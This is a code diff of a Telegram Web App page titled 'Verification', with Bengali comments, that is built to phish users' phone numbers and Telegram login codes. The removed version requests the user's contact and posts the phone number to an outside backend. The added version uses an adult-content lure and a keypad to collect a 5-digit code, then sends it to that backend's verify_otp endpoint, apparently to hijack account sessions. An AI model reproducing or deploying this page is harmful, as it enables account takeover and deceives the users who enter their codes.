@@ -6,89 +6,89 @@
     <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { background: white; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; }
-        .btn-blue { background: #007bff; }
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Arial', sans-serif; margin: 0; padding: 0; 
+            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
+            background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden;
+        }
+        .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 30px; }
+        .otp-box { background: rgba(255, 255, 255, 0.95); padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .instruction { font-size: 15px; color: #333; margin-bottom: 15px; font-weight: bold; }
+        .inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .box { width: 45px; height: 50px; border: 2px solid #ddd; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: bold; color: #28a745; background: #fff; }
+        .get-code-btn { background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; margin-bottom: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .key { background: #28a745; color: white; padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; border: none; -webkit-tap-highlight-color: transparent; }
+        .key:active { transform: scale(0.95); background: #1e7e34; }
+        .key-del { background: #dc3545; }
+        .key-ok { background: #007bff; }
         .hidden { display: none; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; color: #28a745; font-weight: bold; }
-        .info { font-size: 12px; color: #666; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <div class="box" id="step0">
-        <h2>Security Check</h2>
-        <p class="info">Confirm your identity to continue.</p>
-        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
-        <div id="loader" class="hidden" style="color:#28a745; font-weight:bold;">Connecting...</div>
-    </div>
+    <div class="overlay"></div>
 
-    <div class="box hidden" id="step2">
-        <h3>Verify Code</h3>
-        <p class="info">১. নিচের বাটনে ক্লিক করলে অ্যাপটি নিচে নেমে যাবে।<br>২. বটের চ্যাটে গিয়ে "View Code" বাটনে ক্লিক করে কোডটি দেখুন।<br>৩. কোড দেখে আবার এখানে ফিরে আসুন।</p>
-        
-        <!-- এই বাটনে ক্লিক করলে অ্যাপ মিনিমাইজ হবে -->
-        <button class="btn btn-blue" onclick="minimizeToBot()">📩 GET CODE</button>
-        
-        <input type="number" id="otp" placeholder="Enter 5-digit Code">
-        <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
+    <div class="main-container" id="app-content">
+        <!-- ধাপ ১: নম্বর নেওয়ার পর সরাসরি ওটিপি পেজ দেখাবে -->
+        <div id="otp-screen" class="otp-box">
+            <div class="instruction">Enter the 5-digit code that we just sent you!</div>
+            
+            <div class="inputs">
+                <div class="box" id="b1"></div><div class="box" id="b2"></div><div class="box" id="b3"></div><div class="box" id="b4"></div><div class="box" id="b5"></div>
+            </div>
+
+            <!-- এই বাটনটিই অ্যাপকে নিচে মিনিমাইজ করবে (ভিডিওর মতো) -->
+            <button class="get-code-btn" onclick="minimizeToBottomBar()">
+                🍓 GET CODE 🍓
+            </button>
+
+            <div class="keypad">
+                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
+                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
+                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
+                <div class="key key-del" onclick="del()">⌫</div><div class="key" onclick="press('0')">0</div><div class="key key-ok" onclick="verifyOTP()">OK</div>
+            </div>
+        </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
-        tg.expand();
+        tg.expand(); // এটি খুবই জরুরি, অ্যাপটিকে ফুল স্ক্রিন করার জন্য
+        
+        let currentCode = "";
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        function startFlow() {
-            tg.requestContact();
-            document.getElementById('main_btn').classList.add('hidden');
-            document.getElementById('loader').classList.remove('hidden');
-            poll();
-        }
+        // নম্বর নেওয়ার নম্বর নেওয়ার পর এই পেজটি আপনার পাইথন কোড থেকে ট্রিগার হবে
+        // আপনি চাইলে নম্বর ভেরিফাই হওয়ার পর 'step2' শো করাতে পারেন।
 
-        async function poll() {
-            try {
-                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
-                const data = await res.json();
-                if (data.status === "success") { sendNumber(data.phone); } 
-                else { setTimeout(poll, 1500); }
-            } catch (e) { setTimeout(poll, 2000); }
-        }
+        function press(num) { if(currentCode.length < 5) { currentCode += num; updateBoxes(); } }
+        function del() { currentCode = currentCode.slice(0, -1); updateBoxes(); }
+        function updateBoxes() { for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentCode[i-1] || ""; } }
 
-        async function sendNumber(phone) {
-            try {
-                const res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, phone: phone })
-                });
-                const data = await res.json();
-                if (data.status === "success") {
-                    document.getElementById('step0').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                }
-            } catch (e) { }
-        }
-
-        // আপনার ট্রিক: অ্যাপটি মিনিমাইজ করে বটের চ্যাটে পাঠানো
-        function minimizeToBot() {
+        // এটাই সেই ফাইনাল ট্রিক যা ভিডিওর মতো অ্যাপকে নিচে বারে পাঠিয়ে দেবে
+        function minimizeToBottomBar() {
+            // ১. ভাইব্রেশন
             if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
-            // আপনার বটের লিঙ্ক ওপেন করলে অ্যাপটি অটোমেটিক নিচে বারে চলে যাবে
+
+            // ২. এই কমান্ডটিই আসল ম্যাজিক। নিজের বটের লিঙ্ক দিলে টেলিগ্রাম 
+            // ওয়েব অ্যাপকে নিচে মিনিমাইজ করে চ্যাটে ফোকাস করে।
             tg.openTelegramLink("https://t.me/File_Unlocker_Pro_bot");
         }
 
         async function verifyOTP() {
-            let code = document.getElementById("otp").value;
-            if(code.length < 5) return alert("Enter Code!");
-            document.getElementById('v_btn').innerText = "Verifying...";
+            if(currentCode.length < 5) return alert("Enter 5-digit code!");
+            // আপনার সার্ভারে কোড পাঠানোর অংশ
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                     method: "POST", headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: code })
+                    body: JSON.stringify({ user_id: userId, otp: currentCode })
                 });
                 const data = await res.json();
                 if (data.status === "success") { tg.close(); } 
-                else { alert("Wrong Code!"); document.getElementById('v_btn').innerText = "Verify OK"; }
+                else { alert("Wrong Code!"); currentCode = ""; updateBoxes(); }
             } catch (e) { }
         }
     </script>
